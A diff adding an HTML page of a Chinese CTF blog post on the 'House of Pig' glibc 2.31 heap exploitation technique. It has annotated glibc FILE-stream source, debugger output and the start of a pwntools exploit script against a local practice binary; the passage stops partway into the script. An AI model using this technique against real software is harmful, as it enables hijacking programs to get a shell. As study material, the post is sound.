@@ -1,0 +1,803 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="en">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="笔记," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="利用条件 适用版本2.31，高版本也可以  只有calloc来申请堆块，没有malloc，这样没办法申请tcache中的堆块 劫持IO_list_all，可用largebin attack或者是tcache stash unlink。  思路IOFILE攻击，把_IO_file_jumps修改为_IO_str_jumps，利用_IO_str_jumps中的函数_IO_str_overflow 。巧">
+<meta property="og:type" content="article">
+<meta property="og:title" content="houseofpig">
+<meta property="og:url" content="http://example.com/2021/10/22/houseofpig/index.html">
+<meta property="og:site_name" content="Tm0tfl">
+<meta property="og:description" content="利用条件 适用版本2.31，高版本也可以  只有calloc来申请堆块，没有malloc，这样没办法申请tcache中的堆块 劫持IO_list_all，可用largebin attack或者是tcache stash unlink。  思路IOFILE攻击，把_IO_file_jumps修改为_IO_str_jumps，利用_IO_str_jumps中的函数_IO_str_overflow 。巧">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://tmotfl-image.oss-cn-beijing.aliyuncs.com/img/image-20211022001458648.png">
+<meta property="article:published_time" content="2021-10-22T14:31:19.000Z">
+<meta property="article:modified_time" content="2021-10-22T14:31:49.557Z">
+<meta property="article:author" content="Tm0tfl">
+<meta property="article:tag" content="笔记">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://tmotfl-image.oss-cn-beijing.aliyuncs.com/img/image-20211022001458648.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"always","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://example.com/2021/10/22/houseofpig/"/>
+
+
+
+
+
+  <title>houseofpig | Tm0tfl</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="en">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Tm0tfl</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            About
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/10/22/houseofpig/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="http://qvb75z5z6.hn-bkt.clouddn.com/1605841888100229.jpeg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Tm0tfl">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">houseofpig</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2021-10-22T22:31:19+08:00">
+                2021-10-22
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index">
+                    <span itemprop="name">笔记</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h1><ol>
+<li>适用版本2.31，高版本也可以 </li>
+<li>只有<code>calloc</code>来申请堆块，没有<code>malloc</code>，这样没办法申请<code>tcache</code>中的堆块</li>
+<li>劫持<code>IO_list_all</code>，可用<code>largebin attack</code>或者是<code>tcache stash unlink</code>。</li>
+</ol>
+<h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p><code>IOFILE</code>攻击，把<code>_IO_file_jumps</code>修改为<code>_IO_str_jumps</code>，利用<code>_IO_str_jumps</code>中的函数<code>_IO_str_overflow</code> 。巧妙的利用<code>_IO_str_overflow</code>中调用了<code>malloc, memcpy, free</code>这三个函数的性质，可以从<code>tcache</code>取堆块，弥补了没有<code>malloc</code>函数的缺陷，从而实现申请<code>tcache</code>中的堆块。<strong>（这也是精髓我认为）</strong></p>
+<p>如果利用<code>tcache stash unlink attack</code>攻击把<code>freehook</code>放进了<code>tacache</code>第一个位置，（或者是直接修改<code>fd</code>指针放进<code>tcache</code>）就可以直接修改为<code>system</code>，<code>getshell</code>。</p>
+<p>同时<code>2.31</code>中<code>setcontext</code>改为了用<code>rdx</code>控制参数，</p>
+<p><img src="http://tmotfl-image.oss-cn-beijing.aliyuncs.com/img/image-20211022001458648.png" alt="image-20211022001458648"></p>
+<p><code>_IO_str_overflow</code>中有<code>mov rdx, [rdi+28h]</code>，可以通过<code>rdi</code>来控制<code>rdx</code>，调用<code>_IO_str_overflow</code>时，<code>rdi</code>就是<code>_IO_FILE_plus</code>结构体，也就是我们可以在伪造的<code>IOFILE</code>结构体中构造数据控制<code>rdx</code>，同时把<code>mallochook</code>更改为<code>setcontext+61</code>，就会根据<code>rdx</code>来进行<code>srop</code>,从而获得<code>shell</code>或者进行<code>orw</code>。</p>
+<p>下面是<code>_IO_str_overflow</code>源码</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">_IO_str_overflow (FILE *fp, <span class="keyword">int</span> c)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> flush_only = c == EOF;</span><br><span class="line">  <span class="keyword">size_t</span> pos;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_WRITES)</span><br><span class="line">      <span class="keyword">return</span> flush_only ? <span class="number">0</span> : EOF;</span><br><span class="line">  <span class="keyword">if</span> ((fp-&gt;_flags &amp; _IO_TIED_PUT_GET) &amp;&amp; !(fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class="line">      fp-&gt;_IO_write_ptr = fp-&gt;_IO_read_ptr;</span><br><span class="line">      fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_end;</span><br><span class="line">    &#125;</span><br><span class="line">  pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base;</span><br><span class="line">  <span class="keyword">if</span> (pos &gt;= (<span class="keyword">size_t</span>) (_IO_blen (fp) + flush_only))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_USER_BUF) <span class="comment">/* not allowed to enlarge */</span></span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">char</span> *new_buf;</span><br><span class="line">      <span class="keyword">char</span> *old_buf = fp-&gt;_IO_buf_base;</span><br><span class="line">      <span class="keyword">size_t</span> old_blen = _IO_blen (fp);</span><br><span class="line">      <span class="keyword">size_t</span> new_size = <span class="number">2</span> * old_blen + <span class="number">100</span>;</span><br><span class="line">      <span class="keyword">if</span> (new_size &lt; old_blen)</span><br><span class="line">        <span class="keyword">return</span> EOF;</span><br><span class="line">      new_buf = <span class="built_in">malloc</span> (new_size); <span class="comment">//可以构造让new_size申请到tcache中的堆块</span></span><br><span class="line">      <span class="keyword">if</span> (new_buf == <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="comment">/*      __ferror(fp) = 1; */</span></span><br><span class="line">          <span class="keyword">return</span> EOF;</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="keyword">if</span> (old_buf)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">memcpy</span> (new_buf, old_buf, old_blen); <span class="comment">//复制内容，可以在old_buf提前填充好内容</span></span><br><span class="line">          <span class="built_in">free</span> (old_buf); <span class="comment">//free的是old_buf，所以需要保证堆块大小不一样</span></span><br><span class="line">          <span class="comment">/* Make sure _IO_setb won&#x27;t try to delete _IO_buf_base. */</span></span><br><span class="line">          fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="built_in">memset</span> (new_buf + old_blen, <span class="string">&#x27;\0&#x27;</span>, new_size - old_blen);</span><br><span class="line"></span><br><span class="line">      _IO_setb (fp, new_buf, new_buf + new_size, <span class="number">1</span>);</span><br><span class="line">      fp-&gt;_IO_read_base = new_buf + (fp-&gt;_IO_read_base - old_buf);</span><br><span class="line">      fp-&gt;_IO_read_ptr = new_buf + (fp-&gt;_IO_read_ptr - old_buf);</span><br><span class="line">      fp-&gt;_IO_read_end = new_buf + (fp-&gt;_IO_read_end - old_buf);</span><br><span class="line">      fp-&gt;_IO_write_ptr = new_buf + (fp-&gt;_IO_write_ptr - old_buf);</span><br><span class="line"></span><br><span class="line">      fp-&gt;_IO_write_base = new_buf;</span><br><span class="line">      fp-&gt;_IO_write_end = fp-&gt;_IO_buf_end;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!flush_only)</span><br><span class="line">    *fp-&gt;_IO_write_ptr++ = (<span class="keyword">unsigned</span> <span class="keyword">char</span>) c;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_read_end)</span><br><span class="line">    fp-&gt;_IO_read_end = fp-&gt;_IO_write_ptr;</span><br><span class="line">  <span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>下面是<code>IOFILE</code>结构。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p *(struct _IO_FILE_plus *) &amp;_IO_list_all</span><br><span class="line">$<span class="number">1</span> = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = <span class="number">-134470208</span>, </span><br><span class="line">    _IO_read_ptr = <span class="number">0x0</span>, </span><br><span class="line">    _IO_read_end = <span class="number">0x0</span>, </span><br><span class="line">    _IO_read_base = <span class="number">0x0</span>, </span><br><span class="line">    _IO_write_base = <span class="number">0xfbad2087</span> &lt;error: Cannot access memory at address <span class="number">0xfbad2087</span>&gt;, </span><br><span class="line">    _IO_write_ptr = <span class="number">0x7ffff7fc2643</span> &lt;_IO_2_1_stderr_+<span class="number">131</span>&gt; <span class="string">&quot;&quot;</span>,  <span class="comment">//mov rdx, [rdi+0x28],就是_IO_write_ptr</span></span><br><span class="line">    _IO_write_end = <span class="number">0x7ffff7fc2643</span> &lt;_IO_2_1_stderr_+<span class="number">131</span>&gt; <span class="string">&quot;&quot;</span>, </span><br><span class="line">    _IO_buf_base = <span class="number">0x7ffff7fc2643</span> &lt;_IO_2_1_stderr_+<span class="number">131</span>&gt; <span class="string">&quot;&quot;</span>,  <span class="comment">//old_buf 应该设置为填充的地址</span></span><br><span class="line">    _IO_buf_end = <span class="number">0x7ffff7fc2643</span> &lt;_IO_2_1_stderr_+<span class="number">131</span>&gt; <span class="string">&quot;&quot;</span>, <span class="comment">// oldsize = 2*(base-end) + 100</span></span><br><span class="line">    _IO_save_base = <span class="number">0x7ffff7fc2643</span> &lt;_IO_2_1_stderr_+<span class="number">131</span>&gt; <span class="string">&quot;&quot;</span>, </span><br><span class="line">    _IO_backup_base = <span class="number">0x7ffff7fc2643</span> &lt;_IO_2_1_stderr_+<span class="number">131</span>&gt; <span class="string">&quot;&quot;</span>, </span><br><span class="line">    _IO_save_end = <span class="number">0x7ffff7fc2643</span> &lt;_IO_2_1_stderr_+<span class="number">131</span>&gt; <span class="string">&quot;&quot;</span>, </span><br><span class="line">    _markers = <span class="number">0x7ffff7fc2644</span> &lt;_IO_2_1_stderr_+<span class="number">132</span>&gt;, </span><br><span class="line">    _chain = <span class="number">0x0</span>, </span><br><span class="line">    _fileno = <span class="number">0</span>, </span><br><span class="line">    _flags2 = <span class="number">0</span>, </span><br><span class="line">    _old_offset = <span class="number">0</span>, </span><br><span class="line">    _cur_column = <span class="number">0</span>, </span><br><span class="line">    _vtable_offset = <span class="number">0</span> <span class="string">&#x27;\000&#x27;</span>, </span><br><span class="line">    _shortbuf = <span class="string">&quot;&quot;</span>, </span><br><span class="line">    _lock = <span class="number">0x7ffff7fc26a0</span> &lt;_IO_2_1_stdout_&gt;, </span><br><span class="line">    _offset = <span class="number">2</span>, </span><br><span class="line">    _codecvt = <span class="number">0xffffffffffffffff</span>, </span><br><span class="line">    _wide_data = <span class="number">0x0</span>, </span><br><span class="line">    _freeres_list = <span class="number">0x7ffff7fc44b0</span> &lt;_IO_stdfile_2_lock&gt;, </span><br><span class="line">    _freeres_buf = <span class="number">0xffffffffffffffff</span>, </span><br><span class="line">    __pad5 = <span class="number">0</span>, </span><br><span class="line">    _mode = <span class="number">-134473856</span>, </span><br><span class="line">    _unused2 = <span class="string">&quot;\377\177&quot;</span>, <span class="string">&#x27;\000&#x27;</span> &lt;repeats <span class="number">17</span> times&gt;</span><br><span class="line">  &#125;, </span><br><span class="line">  vtable = <span class="number">0x0</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>需要调用<code>_IO_flush_all_lockp</code>来触发攻击，一般是<code>libc</code>执行<code>abort</code>, 程序调用<code>exit</code>或者是程序通过主函数返回。</p>
+<p>可以利用文件结构中<code>chain</code>字段，来实现多次<code>malloc，free</code>，看下源码。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">_IO_flush_all_lockp (<span class="keyword">int</span> do_lock)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> result = <span class="number">0</span>;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *<span class="title">fp</span>;</span></span><br><span class="line">  <span class="keyword">int</span> last_stamp;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  __libc_cleanup_region_start (do_lock, flush_cleanup, <span class="literal">NULL</span>);</span><br><span class="line">  <span class="keyword">if</span> (do_lock)</span><br><span class="line">    _IO_lock_lock (list_all_lock);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  last_stamp = _IO_list_all_stamp;</span><br><span class="line">  fp = (_IO_FILE *) _IO_list_all;</span><br><span class="line">  <span class="keyword">while</span> (fp != <span class="literal">NULL</span>) <span class="comment">//一直伪造chain字段，就可以进入下一个伪造的chunk，不停的申请</span></span><br><span class="line">    &#123;</span><br><span class="line">      run_fp = fp;</span><br><span class="line">      <span class="keyword">if</span> (do_lock)</span><br><span class="line">	    _IO_flockfile (fp);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line">	        || (_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">	        &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">				  &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	   )</span><br><span class="line">	      &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF) <span class="comment">//这里已经被修改为了_IO_str_overflow()</span></span><br><span class="line">	      result = EOF;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (do_lock)</span><br><span class="line">	      _IO_funlockfile (fp);</span><br><span class="line">      run_fp = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (last_stamp != _IO_list_all_stamp)</span><br><span class="line">	    &#123;</span><br><span class="line">	      <span class="comment">/* Something was added to the list.  Start all over again.  */</span></span><br><span class="line">	      fp = (_IO_FILE *) _IO_list_all;</span><br><span class="line">	      last_stamp = _IO_list_all_stamp;</span><br><span class="line">	    &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">	    fp = fp-&gt;_chain;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  <span class="keyword">if</span> (do_lock)</span><br><span class="line">    _IO_lock_unlock (list_all_lock);</span><br><span class="line">  __libc_cleanup_region_end (<span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><p>群友发的题，2.31, <code>UAF</code>, <code>0x80-0x1ff</code>，只能用<code>calloc</code>，有一个类似的题，不过这个不能申请<code>fastbin</code>，所以攻击<code>fastbin</code>链表就不行。</p>
+<p>可以用<code>tcache stash unlink attack</code>把<code>_IO_list_all</code>修改为<code>main_arena</code>地址，释放对应的堆块进入<code>smallbin</code>来伪造<code>chain</code>。</p>
+<p>然后攻击<code>tcache</code>，把<code>mallochook</code>放入<code>tcache</code>第二个位置，就可以根据<code>_IO_str_overflow</code>中的<code>malloc</code>申请到堆块。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span> </span><br><span class="line">	gdb.attach(p)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">size</span>):</span> </span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;size:&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span> </span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;index:&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx, content</span>):</span> </span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;index:&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">	p.sendafter(<span class="string">&#x27;content:&#x27;</span>, content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span> </span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;index:&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./pwn2&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span 